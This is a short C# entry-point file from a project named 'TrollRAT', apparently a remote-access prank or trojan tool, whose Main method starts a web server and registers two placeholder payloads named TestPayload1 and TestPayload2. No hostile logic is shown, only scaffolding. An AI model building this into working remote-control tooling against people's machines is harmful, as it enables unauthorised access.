using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;

namespace TrollRAT
{
    static class Program
    {
        /// <summary>
        /// Der Haupteinstiegspunkt für die Anwendung.
        /// </summary>
        [STAThread]
        static void Main()
        {
            var server = new WebServer();

            server.Payloads.Add(new TestPayload1());
            server.Payloads.Add(new TestPayload2());

            server.run();
        }
    }
}
